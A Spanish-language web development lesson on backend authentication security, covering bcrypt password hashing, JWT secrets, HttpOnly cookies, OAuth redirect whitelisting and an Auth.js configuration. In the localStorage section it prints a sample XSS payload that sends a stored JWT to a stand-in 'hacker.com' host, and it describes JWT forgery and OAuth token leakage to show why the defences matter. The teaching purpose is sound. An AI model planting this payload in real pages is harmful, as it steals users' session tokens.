# Día 9: Backend VI - Seguridad, Autenticación y Prevención de Hackeos

Hasta ahora, nuestra API confía ciegamente en quien le hace peticiones. Si alguien envía un `DELETE /api/users/1`, el servidor obedece. En el mundo real, un backend sin autenticación es un blanco que será vulnerado en cuestión de minutos.

Hoy exploraremos los mecanismos de seguridad, haciendo énfasis en **qué pasa cuando se configuran mal y cómo los atacantes explotan esos errores**.

---

## 1. El Peligro de las Credenciales Propias

La forma más básica de autenticación es pedir un correo y una contraseña. Sin embargo, es la que más dolores de cabeza trae si se hace mal.

### El Error (Lo que hace un novato):
Guardar contraseñas en texto plano en la base de datos (ej. `password: "gatito123"`).
**El Ataque:** Si un hacker encuentra una vulnerabilidad (como una inyección SQL en un sistema antiguo, o simplemente roba un respaldo de la base de datos), obtiene acceso inmediato a las cuentas de todos los usuarios. Peor aún, como la gente recicla contraseñas, el hacker ahora tiene acceso a sus correos y cuentas bancarias.

### El Error Intermedio:
Usar algoritmos de *hashing* obsoletos como MD5 o SHA-1.
**El Ataque:** Los hackers usan "Rainbow Tables" (bases de datos gigantes con billones de contraseñas ya convertidas a MD5). Si tu hash MD5 se filtra, lo descifran en milisegundos.

### La Solución Definitiva (Bcrypt / Argon2):
Antes de que nuestro Servicio (Día 7) guarde al usuario usando Prisma, debemos aplicar un algoritmo de hashing moderno con un **"Salt"** (texto aleatorio que se añade a la contraseña antes de encriptarla).

```typescript
// src/services/userService.ts
import bcrypt from 'bcrypt';
import prisma from '@/lib/prisma';

export const createUser = async (data) => {
  // 1. Generamos un hash seguro con 12 rondas de encriptación (muy lento para fuerza bruta)
  const hashedPassword = await bcrypt.hash(data.password, 12);
  
  // 2. Guardamos el hash, NUNCA la contraseña original
  const newUser = await prisma.user.create({
    data: {
      email: data.email,
      password: hashedPassword,
    }
  });
  return newUser;
};
```

## 2. Sesiones vs JWT: ¿Dónde guardamos la llave?

Una vez que el usuario ingresa su correo y contraseña correcta, no podemos pedirle que lo haga en cada clic. Necesitamos darle un "pase VIP". Aquí entran las Sesiones y los JWT (JSON Web Tokens).

### A. JWT (JSON Web Token)

Un JWT es un string codificado en 3 partes que contiene información del usuario (Payload) y está firmado criptográficamente por el servidor (Signature).

- **El Error de Configuración:** Usar una clave secreta débil (ej. `JWT_SECRET="12345"`).
    
- **El Ataque (JWT Forgery):** Un hacker toma su token, decodifica el Payload (que es público), cambia su `"role": "USER"` a `"role": "ADMIN"`. Como adivinó tu clave "12345", vuelve a firmar el token. ¡Felicidades, acabas de darle control total de tu sistema a un atacante!
    
- **La Prevención:** Usar cadenas criptográficas largas y aleatorias (ej. generadas con `openssl rand -base64 32`) en tu `.env`.
    

### B. El Peligro del `localStorage` (Ataques XSS)

- **El Error:** Cuando el backend genera el JWT, el frontend lo guarda en el `localStorage` del navegador para enviarlo en cada petición.
    
- **El Ataque (XSS - Cross-Site Scripting):** Si tu foro permite comentarios, un hacker escribe un comentario con código JavaScript oculto: `<script>fetch("http://hacker.com?token=" + localStorage.getItem("jwt"))</script>`. Cuando un Administrador lee ese comentario, su navegador ejecuta el código y le envía el JWT al hacker. (Robo de sesión).
    

### C. La Solución: Cookies `HttpOnly`

Para evitar el XSS, el backend debe enviar el JWT (o el ID de sesión) dentro de una Cookie con las banderas `HttpOnly` y `Secure`.

- `HttpOnly`: El navegador oculta la cookie de JavaScript. El ataque XSS del paso anterior ahora devolverá `null`.
    
- `Secure`: Solo viaja por HTTPS, evitando que te roben el token si usas WiFi público.
    

---

## 3. Proveedores OAuth (Google, GitHub)

En lugar de manejar contraseñas, delegamos la seguridad a gigantes tecnológicos.

- **El Error de Configuración:** No validar estrictamente las URLs de redirección (`Callback URIs`) en el panel de Google Cloud o GitHub Developer.
    
- **El Ataque (Open Redirect / Token Leakage):** Un atacante crea un enlace que inicia sesión con tu App, pero modifica el parámetro `redirect_uri` hacia su propio servidor. El usuario se autentica en Google, y Google envía el token de acceso al servidor del atacante en lugar de al tuyo.
    
- **La Prevención:** Configurar listas blancas estrictas en los paneles de los proveedores (ej. solo permitir `https://midominio.com/api/auth/callback/google`).
    

---

## 4. Integración de NextAuth.js (Auth.js)

Implementar Cookies Seguras, rotación de tokens, protección CSRF y encriptación manualmente es reinventar la rueda (y probablemente dejar huecos de seguridad). En el ecosistema Next.js, usamos **NextAuth.js (ahora Auth.js)**.

Auth.js soluciona el 99% de las vulnerabilidades mencionadas automáticamente (usa JWT encriptados por defecto y los guarda en cookies `HttpOnly`).

## Configuración Base (`app/api/auth/[...nextauth]/route.ts`)

Este archivo es un "Catch-all Route" que manejará todo: el login, el logout y los callbacks de OAuth.

```TypeScript
import NextAuth from "next-auth";
import CredentialsProvider from "next-auth/providers/credentials";
import GoogleProvider from "next-auth/providers/google";
import bcrypt from 'bcrypt';
import prisma from '@/lib/prisma';

const handler = NextAuth({
  // 1. Configuración de Sesión Estratégica
  session: { strategy: "jwt" }, // Usamos JWT seguros
  
  // 2. Definición de Proveedores
  providers: [
    GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
    }),
    CredentialsProvider({
      name: "Credenciales",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" }
      },
      // 3. Lógica de Autorización Segura
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) return null;

        const user = await prisma.user.findUnique({
          where: { email: credentials.email }
        });

        if (!user || !user.password) return null; // Evitamos revelar si el usuario existe o no

        // Comparamos el hash de forma segura
        const isPasswordValid = await bcrypt.compare(credentials.password, user.password);

        if (!isPasswordValid) return null;

        // Si todo es correcto, devolvemos los datos no sensibles
        return { id: user.id, name: user.name, email: user.email, role: user.role };
      }
    })
  ],
  
  // 4. EL PASO MÁS IMPORTANTE PARA EVITAR HACKEOS
  // Esta clave firma los tokens. ¡Debe ser larga y secreta!
  secret: process.env.NEXTAUTH_SECRET,
});

export { handler as GET, handler as POST };
```
>[!TIP] Tip de Seguridad Crítico: 
>En tu archivo `.env`, NUNCA dejes `NEXTAUTH_SECRET` vacío o con una cadena simple. Genera uno seguro corriendo este comando en tu terminal: `npx auth secret`.

---

## Resumen del Día 9

Hoy aprendimos que la seguridad no es un feature extra, es la base de la aplicación.
- Vimos cómo un `localStorage` puede ser víctima de un ataque XSS y por qué usamos cookies `HttpOnly`.
- Entendimos la importancia de hacer _hash_ a las contraseñas para proteger los datos de nuestros usuarios incluso si nos vulneran.
- Integramos **Auth.js** para delegar la complejidad criptográfica a una librería testeada por la comunidad y asegurar la plataforma con estándares de la industria.